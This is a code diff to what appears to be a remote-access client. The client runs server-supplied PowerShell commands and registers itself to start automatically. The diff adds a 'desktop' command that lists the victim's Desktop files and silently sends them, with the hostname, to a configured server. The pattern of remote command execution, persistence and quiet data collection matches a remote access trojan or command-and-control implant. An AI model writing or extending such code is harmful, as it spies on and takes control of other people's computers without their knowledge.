@@ -44,6 +44,23 @@ class Client:
                 os.system(f'start powershell -NoExit -Command "{args}"')
             else:
                 os.system("start powershell")
+        elif cmd == "desktop":
+            files = self._get_desktop()
+            self._send_response({"hostname": socket.gethostname(), "files": files})
+
+    def _get_desktop(self) -> list[str]:
+        desktop = os.path.expanduser("~/Desktop")
+        try:
+            return os.listdir(desktop)
+        except Exception:
+            return []
+
+    def _send_response(self, data: dict):
+        try:
+            with socket.create_connection((config.SERVER_HOST, config.RESPONSE_PORT), timeout=10) as conn:
+                conn.sendall(json.dumps(data).encode())
+        except Exception as e:
+            pass
 
     def _register_autostart(self):
         path = sys.executable if sys.executable.endswith(".exe") else f'"{sys.executable}" "{sys.argv[0]}"'
